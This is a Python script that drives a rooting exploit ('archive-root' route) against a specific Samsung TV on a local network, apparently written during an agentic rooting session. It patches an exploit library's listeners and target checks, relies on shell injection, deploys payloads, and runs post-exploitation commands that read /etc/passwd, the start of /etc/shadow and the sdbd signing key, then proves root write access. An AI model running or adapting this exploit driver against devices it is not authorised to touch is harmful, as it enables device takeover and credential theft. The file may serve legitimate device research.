"""Drive the upstream archive-root route against the QEF1A TV.

Adaptations required by this specific TV:
  * /usr/bin/dotnet is Samsung's stripped host: `--list-runtimes` is unsupported,
    so archive_root._check_target is replaced (runtime is 6.0.9).
  * Only TCP 45777 and 8000 are reachable inbound -> pin the capture listener to
    45777 and the root-agent listener to 8000.
"""

import asyncio
import json
import os
import sys
import traceback
from pathlib import Path

sys.path.insert(0, "/tmp/opencode/tv-root/src")
os.environ.setdefault("SDB", "/tmp/opencode/sdb/data/tools/sdb")

from samsung_tv_root import archive_root as ar  # noqa: E402
from samsung_tv_root.sdb import SdbClient  # noqa: E402

CAPTURE_PORT = int(os.environ.get("CAPTURE_PORT", "45777"))
AGENT_PORT = int(os.environ.get("AGENT_PORT", "8000"))
TV = os.environ.get("TV", "10.27.27.3")
HOST = os.environ.get("HOST", "10.27.27.34")

_orig_capture = SdbClient.capture


def capture(self, command, *, callback_host=None, bind_host=None, port=CAPTURE_PORT,
            timeout=30.0, on_listening=None):
    return _orig_capture(self, command, callback_host=callback_host,
                         bind_host=bind_host, port=port, timeout=timeout,
                         on_listening=on_listening)


SdbClient.capture = capture

_orig_server = ar.RootAgentServer


def Server(bind_host, port, expected_peer, secret, *, require_root=True):
    return _orig_server(bind_host, AGENT_PORT, expected_peer, secret,
                        require_root=require_root)


ar.RootAgentServer = Server


def check_target(client):
    client.connect()
    client.require_device()
    client.require_shell_injection()
    caps = ar._capture(client, "getcap /usr/bin/dotnet /usr/sbin/sdbd-tarlauncher")
    hashes = ar._capture(client, ar.SYSTEM_HASH_COMMAND)
    return ar.TargetAssessment(caps, hashes, "6.0")


ar._check_target = check_target


async def main():
    return await ar.probe(
        TV,
        callback_host=HOST,
        bind_host=HOST,
        sdb_timeout=15.0,
        accept_timeout=45.0,
        command_timeout=30.0,
        commands=(
            "id",
            "uname -a",
            "grep -E '^(Uid|Gid|CapEff|CapPrm):' /proc/self/status",
            "cat /etc/passwd",
            "ls -la /etc/shadow && head -c 200 /etc/shadow",
            "sha256sum /usr/share/sdbd/public.pem && head -1 /usr/share/sdbd/public.pem",
            "grep -i smack /proc/self/status",
            "ls -la /usr/sbin/uep* /usr/bin/uep* /etc/uep* 2>&1 | head",
            "cat /proc/1/comm 2>&1; tr '\\0' ' ' < /proc/1/cmdline 2>&1; echo",
            "P=/opt/usr/.root-proof-$$; echo proof > $P && ls -la $P && rm -f $P && echo ROOT_WRITE_OK",
        ),
        payloads=Path("/tmp/opencode/tv-root/payloads/common/out"),
    )


try:
    result = asyncio.run(main())
    print("===== ROOT EVIDENCE =====")
    print(json.dumps(result, indent=2))
    Path("/tmp/opencode/root-evidence.json").write_text(json.dumps(result, indent=2))
except Exception as error:
    print("===== ARCHIVE-ROOT FAILED =====")
    print(f"{type(error).__name__}: {error}")
    traceback.print_exc()
